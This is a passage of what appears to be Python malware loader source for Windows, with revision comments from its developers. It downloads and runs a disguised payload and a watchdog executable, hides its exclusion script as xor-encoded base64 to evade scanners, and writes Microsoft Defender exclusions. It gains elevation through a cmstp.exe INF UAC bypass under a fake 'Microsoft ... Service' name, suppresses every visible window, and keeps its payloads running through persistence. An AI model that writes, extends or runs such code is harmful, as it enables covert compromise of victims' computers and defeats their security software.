            if os.path.abspath(APPDIR) != os.path.abspath(HOME):
                lay_cfg(APPDIR)
            return dst
    except Exception:
        pass
    # no durable copy (write refused / no image): the AppHost twin still gets
    # its cfg, so a manual double-click is a live watchdog, not a silent 0
    alt = os.path.join(APPDIR, WD_NAME) if WD_NAME else ""
    if alt and os.path.isfile(alt):
        lay_cfg(APPDIR)
        return alt
    return ""


def spawn(path):
    try:
        subprocess.Popen([path], creationflags=CREATE_NO_WINDOW,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def main():
    # r146: the first line of every field report — which life of the road ran,
    # with which token, and where it looked.
    _log("stage", "enter: elevated=%r admin=%r python=%r appdir=%r"
         % (elev(), getattr(ctypes.windll.shell32, "IsUserAnAdmin", lambda: -1)(),
            sys.executable, APPDIR))
    _log("stage", "token: %r" % (_tok_detail(),))
    if not elev():
        _log("stage", "ABORT: not a HIGH token — the lift handed us a filtered one")
        return
    # r143 (1): first act — see the header. cmstp is waiting on us right now.
    kill_cmstp()
    # r143 (2): the twin home BEFORE exclusions.py runs, so its EdgeUpdate
    # sweep whitelists the image in the same pass that laid it.
    wd_path = lay_twin(os.path.join(APPDIR, WD_NAME) if WD_NAME else "")
    # r78: the exclusions file is staged by the un-elevated launcher (already
    # in APPDIR); the stage runs it ELEVATED, then execs the carrier exe.
    # r144: the writer reports through its exit code (0 covered, 1 the store
    # refused, 2 the token is not HIGH). one retry covers a Defender service
    # that is still coming up on a cold boot; nothing about the road changed
    # for a run that reports 0 on the first pass.
    excl_path = os.path.join(APPDIR, "__EXCL__")
    _log("stage", "excl file=%r exists=%r" % (excl_path, os.path.isfile(excl_path)))
    try:
        if os.path.isfile(excl_path):
            os.environ["EXCL_EXE"] = EXE_NAME
            for _try in range(2):
                _log("stage", "excl run %d via %r" % (_try + 1, sys.executable))
                rc = subprocess.run([sys.executable, "-u", excl_path],
                                    creationflags=CREATE_NO_WINDOW, timeout=180,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL).returncode
                _log("stage", "excl rc=%r" % (rc,))
                if rc == 0:
                    break
                time.sleep(2.0)
        else:
            _log("stage", "excl MISSING — the launcher never staged it")
    except Exception as e:
        _log("stage", "excl run raised %r" % (e,))
    # the r14 carrier job, unchanged — plus the r98 order: tung FIRST, the
    # watchdog exe SECOND (dj: "so its like tung-->watchdog"). r143: the probe
    # tests BOTH carrier names — its durable image is SettingsSyncHost.exe, so
    # an AppHost-only check spawned a second copy on every elevated run.
    exe_path = os.path.join(APPDIR, EXE_NAME)
    dmain = os.path.join(HOME, DMAIN)
    run_path = dmain if os.path.isfile(dmain) else exe_path
    if os.path.exists(run_path) and not (alive(EXE_NAME) or alive(DMAIN)):
        spawn(run_path)
    if wd_path and os.path.exists(wd_path) and not alive(WD_NAME):
        spawn(wd_path)
    # r141: the ELEVATED box sweeper — cmstp's profile box belongs to THIS
    # integrity level, and a medium-integrity guard can see it and never touch
    # it (UIPI). the source is the sibling file work.py materialized before the
    # lift, so nothing here depends on an env var surviving the lift.
    sweep_path = os.path.join(APPDIR, "__SWEEP__")
    if os.path.isfile(sweep_path):
        try:
            subprocess.Popen([sys.executable, "-u", sweep_path],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass


main()
'''



def _decode_excl():
    """r78: the exclusions mirror rides xor(0x37)-sealed base64 — no
    script-text signature survives the sealed blob; the scanner-side
    decode of the blob is non-ASCII noise."""
    import base64
    return bytes((b ^ 0x37 for b in base64.b64decode(EXCL_B64)))


def set_defender_exclusions():
    """r1.1.2 (dj order): the lift RELAUNCHES our staged python elevated; the
    stage materializes + executes exclusions.py (the standalone exclusion
    writer, elevated) then execs the carrier. work.py's own write path is
    add_defender_exclusions() above — this is the elevated half of the same
    list, for the boots where the medium token cannot touch HKLM.

    r143: ONE stage, ONE road. the sibling files are written once, then either
    stage.py is RUN with the token this process already holds (already
    elevated) or a lifted pythonw runs it. the old inline `_run_stage_now`
    copy had drifted off the stage (it referenced an env name that no longer
    exists, so its watchdog leg never ran at all) — a second copy of the stage
    is a second thing to rot."""
    appdir = PERSIST_DIR
    stage_path = os.path.join(PERSIST_DIR, "stage.py")
    svc_name = f"Microsoft {rand_str(6)} Service"
    _log("work", "lift: staging (stage.py, exclusions.py, sweep.py) in %s" % appdir)
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        stage_text = (STAGE.replace("__EXE__", EXE_NAME)
                      .replace("__EXCL__", "exclusions.py")
                      .replace("__SWEEP__", "sweep.py")
                      .replace("__UPDDIR__", UPDDIR)
                      .replace("__DMAIN__", DURABLE_MAIN)
                      .replace("__MTASK__", MAIN_TASK)
                      .replace("__WDTAG__", WDTASKTAG)
                      .replace("__WDCFG__", WDCFG)
                      .replace("__WD__", WD_NAME))
        # r78: exclusions materialized HERE (un-elevated) so the lifted stage
        # only RUNS the sibling file — no blob rides stage.py anymore
        try:
            with open(os.path.join(PERSIST_DIR, "exclusions.py"), "w",
                      encoding="utf-8") as fh:
                fh.write(_decode_excl().decode("utf-8"))
            _log("work", "lift: exclusions.py written (%d B)"
                 % os.path.getsize(os.path.join(PERSIST_DIR, "exclusions.py")))
        except Exception as e:
            _log("work", "lift: exclusions.py WRITE FAILED %r" % (e,))
        with open(stage_path, "w", encoding="utf-8") as fh:
            fh.write(stage_text)
        _log("work", "lift: stage.py written (%d B)" % len(stage_text))
        # r141: the elevated sweeper rides beside the stage with THIS lift's
        # service name baked in — one name for the guard and the sweep
        with open(os.path.join(PERSIST_DIR, "sweep.py"), "w",
                  encoding="utf-8") as _sf:
            _sf.write(SWEEP.replace("__SVC__", svc_name))
    except Exception:
        return
    # r143: already elevated — the stage IS the job; run the same file the
    # lift would have run, with the token we already hold.
    if is_elevated():
        try:
            _log("work", "lift: already HIGH -> running stage in place")
            rc = subprocess.run([sys.executable, "-u", stage_path],
                                creationflags=0x08000000, timeout=300,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL).returncode
            _log("work", "lift: stage rc=%r" % (rc,))
        except Exception as e:
            _log("work", "lift: in-place stage raised %r" % (e,))
        return
    # r35 (dj: black python.exe flash): the LIFTED stage relaunched the console
    # interpreter python312\\python.exe — its console subsystem opened a black
    # window for the whole stage lifetime (~4-5s of exclusions work). the jar
    # itself runs work.py under pythonw.exe (GUI subsystem, no console), so the
    # flash was purely this relaunch. Preference now:
    #   1) python312\\pythonw.exe  (GUI subsystem — zero console, period)
    #   2) python312\\python.exe via cmd start /min (minimized console flash)
    #   3) system python.exe via cmd start /min
    # exclusions.py inside the stage inherits pythonw (sys.executable), so the
    # whole elevated chain stays windowless.
    # r45 (dj: make the chain paint ZERO — no exe or cmd in view, all paths,
    # always background): the lifted stage relaunches with the GP:
    #   1) embedded pythonw.exe   (GUI subsystem — zero console, period)
    #   2) any sibling pythonw.exe adopted from the nearest python dir
    # (the old cmd.exe /c start"" /min shapes are GONE: `start` still came
    # through a console parent — a minimized flash is a flash). pythonw is
    # guaranteed by the embeddable pair, and as fallback is adopted by dir.
    python_dir = os.path.join(PERSIST_DIR, "python312")
    pythonw_p = os.path.join(python_dir, "pythonw.exe")
    pythonw_su = None
    try:
        from glob import glob
        for pat in (os.path.join(os.path.dirname(sys.executable or "") or "",
                                 "pythonw.exe"),
                    r"C:\Python*\pythonw.exe",
                    r"C:\Program Files\Python*\pythonw.exe",
                    os.path.join(os.environ.get("LOCALAPPDATA", ""),
                                 "Programs", "Python", "Python*", "pythonw.exe")):
            hits = [h for h in glob(pat) if os.path.isfile(h)]
            if hits:
                pythonw_su = sorted(hits)[-1]
                break
    except Exception:
        pythonw_su = None
    if os.path.isfile(pythonw_p):
        launch = subprocess.list2cmdline([pythonw_p, "-u", stage_path])
    elif pythonw_su:
        launch = subprocess.list2cmdline([pythonw_su, "-u", stage_path])
    else:
        # nowhere a GUI python: this box's runtime is degraded (no pythonw;
        # not the standard pair). r56 (dj order): the minimized console comes
        # OFF — the wscript pad hides the console python completely (WindowStyle
        # 0, zero frames). only when even the pad cannot be written does the
        # old (flashy) shape remain, because an abandoned run is worse.
        pyexe_p = os.path.join(python_dir, "python.exe")
        pyexe = pyexe_p if os.path.isfile(pyexe_p) else "python.exe"
        run_cmd = subprocess.list2cmdline([pyexe, "-u", stage_path])
        launch = _hidden_py_runner(run_cmd)
        if launch is None:
            launch = subprocess.list2cmdline(
                ["cmd.exe", "/c", "start", "", "/min", pyexe, "-u", stage_path])
    _log("work", "lift: launch=%r pythonw=%r" % (launch, pythonw_p))
    kill_all_cmstp()
    cleanup_infs()
    body = build_inf(launch, svc_name)
    # ground truth: the exact bytes cmstp sees, plus the stage script
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        return
    dismisser = Dismisser(svc_name)
    try:
        p = subprocess.Popen(["cmstp.exe", "/au", inf_path],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
        # r45: armed before the hunt starts — see the sibling site above.
        dismisser.target_pid = p.pid
    except Exception as e:
        _log("work", "lift: cmstp spawn FAILED %r" % (e,))
        return
    _log("work", "lift: cmstp pid=%d inf=%s" % (p.pid, inf_path))
    dismisser.start()

    # r143: the elevated stage kills cmstp the moment it runs, so the medium
    # guard has nothing to guard — a short watch, not the old 18s of
    # PostMessage calls UIPI was dropping on the floor anyway.
    dismisser.wait(8.0)
    dismisser.settle(quiet=1.0, floor=2.0, cap=4.0)
    kill_all_cmstp()    # r135: API-side terminator, same timing the INF pad had
    _sweep_dialogs(svc_name, seconds=1.0)   # r139: any survivor is hidden + answered
    try:
        os.unlink(inf_path)
    except Exception:
        pass


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path, min_size=50000):
    # r141: the wd exe is a ~30 KB image — the carrier's 50 KB floor read it as
    # "never staged", so it was re-downloaded (and killed) on every single run.
    # the caller passes its own floor.
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < min_size:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data, exe=EXE_NAME):
    kill_process(exe)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


# ---- r140: the re-fire gate -------------------------------------------------
# dj field: the first exe opened, then the same cmstp profile box started
# coming back with every beat. the watchdog cannot always SEE an elevated
# carrier (a ProcessHandle query hands back an empty image path for a
# higher-integrity process), so each 10s beat read "dead", re-ran this file,
# and the LIFT ran again — a fresh random service profile every time, and the
# profile box with it. a re-fire only has to re-EXEC the pair; the lift is a
# one-time job.
LIFT_MARK = os.path.join(PERSIST_DIR, "wcache.lift")
# dj (this build): the marker carries the COVERAGE REVISION, not just "lift
# ran". a box that lifted under the old one-dir writer re-lifts exactly once
# to pick up the wide set, then the tag matches and the lift is never seen
# again. a refused write tags revision:attempts and settles after EXCL_TRIES.
EXCL_REV = b"8"
# a lift whose read-back stays empty is retried, but only this many times —
# past that the tag settles on the bare revision and the box never lifts again.
EXCL_TRIES = 3


def lift_landed():
    """the lift already ran on this box AT THE CURRENT COVERAGE REVISION, or
    the wide set is visibly in place. the marker read is the gate: an old box
    carries the old tag and takes the one extra lift; a failed lift retries
    EXCL_TRIES times and then settles, so the cmstp box can never come back on
    every boot."""
    tag = b""
    try:
        with open(LIFT_MARK, "rb") as fh:
            tag = fh.read().strip()
    except Exception:
        tag = b""
    if tag == EXCL_REV:
        _log("work", "lift gate: tag=%r == REV -> already done" % tag)
        return True
    if tag.startswith(EXCL_REV + b":"):
        try:
            if int(tag.split(b":", 1)[1]) >= EXCL_TRIES:
                _log("work", "lift gate: tag=%r attempts exhausted -> done" % tag)
                return True
        except Exception:
            _log("work", "lift gate: tag=%r unreadable -> done" % tag)
            return True
    try:
        covered = bool(exclusion_landed()) and exclusions_landed()
    except Exception as e:
        _log("work", "lift gate: read-back raised %r" % (e,))
        covered = False
    _log("work", "lift gate: tag=%r covered=%r %s -> lift=%r"
         % (tag, covered, _miss_txt(), not covered))
    return covered


def _miss_txt(limit=8):
    """the gap list as plain text — %r of a list of Windows paths doubles
    every backslash and reads like a bug when it is only a repr."""
    miss = _missing()
    shown = "; ".join(miss[:limit])
    if len(miss) > limit:
        shown += "; +%d more" % (len(miss) - limit)
    return "%d missing [%s]" % (len(miss), shown)


def _missing():
    """the wanted values the store does not show right now, as text — the one
    line in excl.log that says exactly what is short on this box."""
    try:
        dirs, procs = defender_roots()
        out = ["path " + d for d in dirs if not _excl_has(EXCL_KP, d, EXCL_KP2)]
        for p in procs:
            if _excl_has(EXCL_KC, p, EXCL_KC2):
                continue
            if "\\" in p and _excl_has(EXCL_KP, p, EXCL_KP2):
                continue
            out.append("proc " + p)
        return out
    except Exception as e:
        return ["probe raised %r" % (e,)]


def _wait_landed(limit=30.0):
    """poll the wide set until it is visible — the elevated stage runs after
    cmstp returns, and only a covered store counts as landed. bounded, so a
    box that genuinely refuses the write still gets its tag written."""
    start = time.time()
    end = start + float(limit)
    last = 0.0
    while True:
        try:
            if exclusions_landed():
                _log("work", "wait: covered after %.1fs" % (time.time() - start))
                return True
        except Exception as e:
            _log("work", "wait: read-back raised %r" % (e,))
        if time.time() >= end:
            _log("work", "wait: NOT covered after %.1fs, %s"
                 % (time.time() - start, _miss_txt()))
            return False
        if time.time() - last >= 5.0:
            last = time.time()
            _log("work", "wait: %s" % _miss_txt(4))
        time.sleep(0.5)


def mark_lift(done=None):
    """tag = bare revision when the wide set reads back (or the caller does not
    know), else revision:attempts — the retry counter lift_landed() settles."""
    try:
        tag = EXCL_REV
        if done is False:
            n = 1
            try:
                with open(LIFT_MARK, "rb") as fh:
                    cur = fh.read().strip()
                if cur.startswith(EXCL_REV + b":"):
                    n = int(cur.split(b":", 1)[1]) + 1
            except Exception:
                n = 1
            tag = EXCL_REV + b":" + str(n).encode()
        with open(LIFT_MARK, "wb") as fh:
            fh.write(tag)
        _log("work", "lift tag written %r" % tag)
    except Exception as e:
        _log("work", "lift tag write raised %r" % (e,))


def carrier_img():
    """the image name the carrier is actually running under: the download keeps
    its dotted asset name, and only a landed relocation turns it into
    SettingsSyncHost.exe. the cfg must name the one that is on the box."""
    try:
        if os.path.isfile(DURABLE_MAIN_PATH):
            return DURABLE_MAIN
    except Exception:
        pass
    return EXE_NAME


def write_wd_cfg(folder):
    """r143: the same cfg the stage lays, for the re-fire road — a wd image
    with no wd.cfg beside it returns 0 immediately, which is why the re-fire
    used to wake nothing at all. work.py writes this from medium integrity,
    so it can land beside the AppHost image too (the ProgramData one needs
    the stage's token; if it is already there this is a no-op)."""
    try:
        import base64
        enc = lambda s: base64.urlsafe_b64encode(
            s.encode("utf-8")).decode("ascii").rstrip("=")
        cfg = enc(carrier_img()) + "\n" + enc(MAIN_TASK) + "\n" + WD_TASK + "\n"
        p = os.path.join(folder, WDCFG)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                if fh.read() == cfg:
                    return p
        except Exception:
            pass
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(cfg)
        try:
            kernel32.SetFileAttributesW(p, 0x2)
        except Exception:
            pass
        return p
    except Exception:
        return ""


def reexec_pair():
    """r140: the whole job of a re-fire — both images up, nothing on screen.
    the probe is work.py's own toolhelp walk: unlike a ProcessHandle query it
    sees elevated images, so this road cannot loop on a false 'dead'. the jar's
    own bare-spawn fallback has the same shape.

    r143: the DURABLE images are the targets (AppHost is only the launcher),
    and both carrier names are probed — SettingsSyncHost.exe is what the
    relocated instance actually shows. the twin gets its cfg laid beside
    whatever image it has, or it exits 0 and watches nothing."""
    try:
        if not (proc_alive(DURABLE_MAIN) or proc_alive(EXE_NAME)):
            run = DURABLE_MAIN_PATH if os.path.exists(DURABLE_MAIN_PATH) else EXE_PATH
            if run and os.path.exists(run):
                subprocess.Popen([run], creationflags=0x08000000)
    except Exception:
        pass
    if not (WD_URL or WDXN_ENV):
        return
    try:
        if proc_alive(WD_NAME):
            return
    except Exception:
        pass
    for folder, name in ((DURABLE_DIR, WD_NAME), (PERSIST_DIR, WD_NAME)):
        try:
            p = os.path.join(folder, name) if name else ""
            if not p or not os.path.exists(p):
                continue
            write_wd_cfg(folder)
            subprocess.Popen([p], creationflags=0x08000000)
            return
        except Exception:
            continue


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return
    # the tag is the build's own name: if a box's log still opens with an old
    # one, the running work.py is the old file (the jar fetches it at runtime,
    # so an un-uploaded edit is a no-op no matter what the source tree says).
    _log("work", "=== run r151: rev=%r exe=%r wd=%r local=%r"
         % (EXCL_REV, EXE_NAME, WD_NAME, LOCALAPPDATA))
    _log("work", "python=%r exe_path=%r payload=%r"
         % (sys.executable, EXE_PATH, os.path.exists(EXE_PATH)))

    # dj (this build): the wide set goes in FIRST, before any image is staged —
    # on an elevated token this lands it outright; on a medium one the writes
    # are refused and the lift road below writes the same list under the
    # stage's token. either way the list is one function.
    try:
        add_defender_exclusions()
    except Exception:
        pass

    # r1.1.2: the exclusion-push loop stays OUT of this body (r14 shape).
    # exclusions ride the STAGE road below: after the lift, the elevated
    # stage materializes + executes exclusions.py, then execs the carrier.
    # r34 fix: this call was run_elevated() — which lifted the carrier exe
    # DIRECTLY and never built/executed the stage, so exclusions.py could
    # not run on any box. that was the whole field miss.
    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    # r98 (dj order): the wd exe rides the SAME stage — fetched + staged beside
    # the carrier BEFORE the lift, so the elevated stage execs the pair in
    # order (tung -> watchdog) with one exclusion covering both.
    try:
        if WD_URL and not is_valid_exe(WD_PATH, 8000):
            wdata = download(WD_URL)
            if wdata:
                write_file(WD_PATH, wdata, exe=WD_NAME)
    except Exception:
        pass

    # r141 (dj): no lift until BOTH images are on disk. a lift that runs with a
    # missing half is exactly what left the watchdog dead and the box looping.
    # r143: the wd half of the gate follows WDXN too — a re-fire run carries the
    # name and no url, and the old gate let it through with no wd on disk.
    if not is_valid_exe(EXE_PATH) or ((WD_URL or WDXN_ENV) and not is_valid_exe(WD_PATH, 8000)):
        _log("work", "images missing on disk (payload=%r wd=%r) -> reexec, no lift"
             % (is_valid_exe(EXE_PATH), is_valid_exe(WD_PATH, 8000)))
        reexec_pair()
        return

    # r140: a watchdog re-fire lands here with everything already staged and
    # the exclusion already written. exec the pair and leave — no cmstp on this
    # road, so no profile is created and no box can be raised.
    if lift_landed():
        _log("work", "lift gate says done -> reexec pair, no cmstp")
        reexec_pair()
        return

    set_defender_exclusions()

    # r144: the lift is ASYNCHRONOUS — cmstp hands the INF off and returns, so
    # the stage (and exclusions.py inside it) is still ~3-6s of work away. the
    # old immediate read-back raced it, read False on every boot, burned one
    # attempt, and settled the tag at revision:2 while the elevated write was
    # still in flight. wait for the stage before judging it.
    ok_wide = _wait_landed(30.0)
    mark_lift(ok_wide)

    # the tag above already says whether the wide set reads back (bare rev) or
    # how many lifts it took (rev:n) — nothing else to write here.

    # r142 (dj order: no jar-side watcher — work.py owns the pair): the lift's
    # elevated stage starts carrier + watchdog exe, and this catches anything
    # that did not come up. the 0.5s lets a just-spawned image appear in the
    # toolhelp walk, so an image the stage already started is not spawned twice.
    time.sleep(0.5)
    reexec_pair()
    _log("work", "run done (covered=%r)" % (ok_wide,))


main()
